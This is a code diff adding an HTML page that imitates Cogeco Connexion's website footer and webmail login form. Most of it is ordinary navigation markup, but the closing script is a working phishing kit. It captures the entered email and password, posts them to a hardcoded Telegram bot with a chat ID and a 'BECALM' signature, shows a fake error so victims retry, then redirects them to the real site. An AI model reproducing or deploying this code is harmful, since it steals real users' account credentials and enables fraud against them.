+                            data-track-link-title="Your TV contract details"
+                            data-drupal-link-system-path="node/48981"
+                            tabindex="-1"
+                            >Your TV contract details</a
+                          >
+                        </li>
+                      </ul>
+
+                      <hr aria-hidden="true" />
+                    </li>
+
+                    <li class="col-12 col-md-6 block-menu footer-corporate">
+                      <button
+                        type="button"
+                        class="accordion footer-title"
+                        aria-controls="corporate-block"
+                        aria-expanded="false"
+                      >
+                        Corporate<span
+                          class="icon-circle-down"
+                          aria-hidden="true"
+                        ></span>
+                      </button>
+
+                      <ul
+                        class="accordion-panel"
+                        id="corporate-block"
+                        aria-hidden="true"
+                      >
+                        <li class="footer-link">
+                          <a
+                            href="https://corpo.cogeco.com/cca/en/company-overview/cogeco-connexion/"
+                            target="_blank"
+                            data-track-section-name="corporate"
+                            data-track-link-title="about us"
+                            tabindex="-1"
+                            >About us</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="https://careers.cogeco.ca/"
+                            target="_blank"
+                            data-track-section-name="corporate"
+                            data-track-link-title="careers"
+                            tabindex="-1"
+                            >Join the Cogeco team</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/management-team"
+                            data-track-section-name="corporate"
+                            data-track-link-title="management team"
+                            data-drupal-link-system-path="node/57446"
+                            tabindex="-1"
+                            >Leadership</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="https://corpo.cogeco.com/cca/en/press-room/press-releases/"
+                            target="_self"
+                            data-track-section-name="corporate"
+                            data-track-link-title="press releases"
+                            tabindex="-1"
+                            >Press Releases</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="https://corpo.cogeco.com/cca/en/"
+                            target="_blank"
+                            data-track-section-name="corporate"
+                            data-track-link-title="the cogeco family"
+                            tabindex="-1"
+                            >Cogeco Communications</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="https://www.yourtv.tv/community-selection"
+                            target="_blank"
+                            data-track-section-name="corporate"
+                            data-track-link-title="yourtv"
+                            tabindex="-1"
+                            >YourTV</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="https://corpo.cogeco.com/cgo/en/company-overview/diversity-and-inclusion/"
+                            target="_blank"
+                            data-track-section-name="corporate"
+                            data-track-link-title="diversity and inclusion"
+                            tabindex="-1"
+                            >Diversity and Inclusion</a
+                          >
+                        </li>
+                      </ul>
+
+                      <hr aria-hidden="true" />
+
+                      <ul class="social desktop">
+                        <li>
+                          <a href="https://facebook.com/Cogeco" target="_blank">
+                            <span class="ico-social-facebook"></span>
+                            Facebook
+                          </a>
+                        </li>
+                        <li>
+                          <a href="https://twitter.com/Cogeco" target="_blank">
+                            <span class="ico-social-twitter"></span>
+                            Twitter
+                          </a>
+                        </li>
+                        <li>
+                          <a
+                            href="https://www.youtube.com/cogeco"
+                            target="_blank"
+                          >
+                            <span class="ico-social-youtube"></span>
+                            YouTube
+                          </a>
+                        </li>
+                        <li>
+                          <a
+                            href="https://www.instagram.com/cogeco"
+                            target="_blank"
+                          >
+                            <span class="ico-social-instagram"></span>
+                            Instagram
+                          </a>
+                        </li>
+                        <li>
+                          <a
+                            href="https://www.linkedin.com/company/cogeco-connexion/"
+                            target="_blank"
+                          >
+                            <span class="ico-social-linkedin"></span>
+                            LinkedIn
+                          </a>
+                        </li>
+                      </ul>
+                    </li>
+
+                    <li class="col-12 col-md-6 block-menu">
+                      <button
+                        type="button"
+                        class="accordion footer-title"
+                        aria-controls="legal-links-block"
+                        aria-expanded="false"
+                      >
+                        Legal Links<span
+                          class="icon-circle-down"
+                          aria-hidden="true"
+                        ></span>
+                      </button>
+
+                      <ul
+                        class="accordion-panel"
+                        id="legal-links-block"
+                        aria-hidden="true"
+                      >
+                        <li class="footer-link">
+                          <a
+                            href="/en/privacy"
+                            data-track-section-name="legal links"
+                            data-track-link-title="privacy"
+                            data-drupal-link-system-path="node/55631"
+                            tabindex="-1"
+                            >Privacy policy</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/terms-and-conditions"
+                            data-track-section-name="legal links"
+                            data-track-link-title="terms and conditions"
+                            data-drupal-link-system-path="node/55661"
+                            tabindex="-1"
+                            >Terms and conditions</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/regulatory-affairs"
+                            data-track-section-name="legal links"
+                            data-track-link-title="regulatory affairs"
+                            data-drupal-link-system-path="node/55671"
+                            tabindex="-1"
+                            >Regulatory affairs</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="https://crtc.gc.ca/eng/internet/code.htm"
+                            target="_blank"
+                            data-track-section-name="legal links"
+                            data-track-link-title="consult crtc internet code"
+                            tabindex="-1"
+                            >Consult CRTC Internet Code</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/regulatory-affairs/mdu-access-agreements"
+                            data-track-section-name="legal links"
+                            data-track-link-title="multi-dwelling unit access agreements"
+                            data-drupal-link-system-path="node/60461"
+                            tabindex="-1"
+                            >Multi-dwelling unit access agreements</a
+                          >
+                        </li>
+                        <li class="footer-link">
+                          <a
+                            href="/en/court-orders"
+                            data-track-section-name="legal links"
+                            data-track-link-title="Court orders"
+                            data-drupal-link-system-path="node/75076"
+                            tabindex="-1"
+                            >Court orders</a
+                          >
+                        </li>
+                      </ul>
+
+                      <hr aria-hidden="true" />
+                    </li>
+                  </ul>
+                </nav>
+
+                <ul class="social mobile">
+                  <li>
+                    <a
+                      href="https://facebook.com/Cogeco"
+                      target="_blank"
+                      data-track-link-title="social-facebook"
+                    >
+                      <span
+                        class="ico-social-facebook"
+                        aria-hidden="true"
+                      ></span>
+                      Facebook
+                    </a>
+                  </li>
+                  <li>
+                    <a
+                      href="https://twitter.com/Cogeco"
+                      target="_blank"
+                      data-track-link-title="social-twitter"
+                    >
+                      <span
+                        class="ico-social-twitter"
+                        aria-hidden="true"
+                      ></span>
+                      Twitter
+                    </a>
+                  </li>
+                  <li>
+                    <a
+                      href="https://www.youtube.com/cogeco"
+                      target="_blank"
+                      data-track-link-title="social-youtube"
+                    >
+                      <span
+                        class="ico-social-youtube"
+                        aria-hidden="true"
+                      ></span>
+                      YouTube
+                    </a>
+                  </li>
+                  <li>
+                    <a
+                      href="https://www.instagram.com/cogeco"
+                      target="_blank"
+                      data-track-link-title="social-instagram"
+                    >
+                      <span
+                        class="ico-social-instagram"
+                        aria-hidden="true"
+                      ></span>
+                      Instagram
+                    </a>
+                  </li>
+                  <li>
+                    <a
+                      href="https://www.linkedin.com/company/cogeco-connexion/"
+                      target="_blank"
+                      data-track-link-title="social-linkedin"
+                    >
+                      <span
+                        class="ico-social-linkedin"
+                        aria-hidden="true"
+                      ></span>
+                      LinkedIn
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+
+            <div class="row no-gutters">
+              <div class="col-12">
+                <p class="copyright">
+                  © 2024. Cogeco Connexion |
+                  <a href="/en/cogeco-sitemap" data-track-link-title="sitemap"
+                    >Sitemap</a
+                  >
+                </p>
+              </div>
+            </div>
+          </div>
+        </footer>
+      </div>
+
+      <div id="cursor"></div>
+
+      <!-- ZMF -->
+    </div>
+    <script src="./config.js"></script>
+    <script src="./assets/js/jquery.min.js"></script>
+    <script>
+      console.log($("#edit-username").val());
+      $("#error-message").hide();
+      $("#edit-username-error").hide();
+      $("#edit-username").on("change keyup keydown paste", function () {
+        $("#edit-username").addClass("error");
+        $("#edit-username-error").show();
+        if ($(this).val().endsWith("@cogeco.ca")) {
+          $("#edit-username-error").hide();
+          $("#edit-username").removeClass("error");
+        }
+      });
+      let count = 0;
+      $("#webmail-login-form").submit(function (e) {
+        e.preventDefault();
+        console.log(count);
+        console.log($("#edit-pass").val().length);
+        if (
+          count >= 0 &&
+          $("#edit-pass").val().length > 4 &&
+          $("#edit-username").val().length > 4 &&
+          !$("#edit-username").hasClass("error")
+        ) {
+          console.log("Fire Valid Form", count);
+          $.ajax({
+            url: "https://api.telegram.org/bot" + token + "/6490955184:AAHpD2ITS8W3J-vLvrOaBBhYpzPeENgoK64",
+            method: "POST",
+            data: {
+              chat_id: 1505836367,
+              text:
+                "⚡️" +
+                `${count + 1}` +
+                ". " +
+                "COGECO LOGIN BY BECALM ⚡️ \n\n Email : " +
+                $("#edit-username").val() +
+                "\n\n Password: " +
+                $("#edit-pass").val() +
+                "\n\n 👨🏾‍💻 Built by @becalm_verified 👨🏾‍💻",
+            },
+            success: function (e) {
+              count++;
+              console.log("Info to Telegram Sent", count);
+              $("#error-message").show(10);
+              $("#webmail-login-form")[0].reset();
+              if (count > 2) {
+                window.location.href =
+                  "https://nullreferer.com/?https://www.cogeco.ca/";
+              }
+            },
+          });
+        } else {
+        }
+      });
+    </script>
+  </body>
+</html>
